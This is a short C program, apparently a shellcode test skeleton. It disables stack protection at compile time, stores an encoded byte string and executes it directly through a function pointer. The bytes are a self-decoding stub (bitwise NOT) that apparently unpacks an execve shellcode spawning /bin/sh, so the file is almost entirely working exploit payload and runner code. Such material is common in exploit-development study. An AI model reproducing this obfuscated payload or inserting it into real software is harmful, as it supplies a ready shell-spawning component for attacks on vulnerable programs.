// compile with
// gcc -fno-stack-protector -z execstack _shellskeleton.c shellskeleton

#include<stdio.h>
#include<string.h>

unsigned char code [] = \
"\xeb\x0c\x5e\x31\xc9\xb1\x19\xf6\x16\x46\xe2\xfb\xeb\x05\xe8\xef\xff\xff\xff\xce\x3f\xaf\x97\x91\xd0\x8c\x97\x97\xd0\xd0\x96\x76\x1c\xaf\x76\x1d\xac\x76\x1e\x4f\xf4\x32\x7f";

main()
{
    printf("Shellcode Lenth: %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}